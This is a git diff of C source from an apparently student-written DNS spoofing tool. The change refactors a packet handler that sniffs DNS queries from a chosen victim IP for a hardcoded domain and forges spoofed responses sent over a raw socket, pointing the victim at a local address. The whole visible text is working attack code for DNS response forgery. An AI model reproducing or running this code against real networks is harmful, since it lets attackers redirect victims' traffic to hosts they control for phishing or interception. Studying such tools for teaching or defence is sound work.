@@ -208,15 +208,19 @@ void dnsSpoof(struct DnsSniffArgs *args) {
     pcap_freealldevs(allDevs);
 }
 
+
+
 void dnsGotPacket(unsigned char *args, const struct pcap_pkthdr *header,
                   const unsigned char *packet) {
     struct DnsSniffArgs *params = (struct DnsSniffArgs *)args;
 
-    // tmp fake spoofing address
-    struct in_addr spoofIp;
-    spoofIp.s_addr = 0x1300a8c0;
-    unsigned char addressFilter[] = {0x09, 'm', 'i', 'l', 'l', 'i',  'w', 'a', 'y', 's',
-                                     0x04, 'b', 'c', 'i', 't', 0x02, 'c', 'a', 0x00};
+    // this is the domain ip pair struct
+    struct DomainIpPair pair;
+
+    // TODO: hard coded values for testing, remove
+    pair.ip.s_addr = 0x1300a8c0;
+    unsigned char addressFilter[] = {0x09, 'm', 'i', 'l', 'l', 'i',  'w', 'a', 'y', 's', 0x04, 'b', 'c', 'i', 't', 0x02, 'c', 'a', 0x00};
+    memcpy(pair.name, addressFilter, sizeof(addressFilter));
 
     struct iphdr *ip;
     struct udphdr *udp;
@@ -233,10 +237,11 @@ void dnsGotPacket(unsigned char *args, const struct pcap_pkthdr *header,
     sin.sin_port = udp->dest;
     sin.sin_addr.s_addr = ip->saddr;
 
-    bool isTarget = isSameQuestion(addressFilter, query);
+    // TODO: use this funciton to find the correct DomainIpPair to use for poisoning
+    bool isTarget = isSameQuestion(pair.name, query);
 
     if (dns->qr == DNS_QUERY && ip->saddr == params->victimIp->s_addr && isTarget) {
-        int responseSize = forgeDns(dns, &spoofIp, params->buffer + 20 + 8);
+        int responseSize = forgeDns(dns, &pair.ip, params->buffer + 20 + 8);
         fillIpUdpHeader(params->buffer, ip->daddr, ip->saddr, udp->dest, udp->source,
                         responseSize);
         sendto(params->rawSocket, params->buffer, 20 + 8 + responseSize, 0,
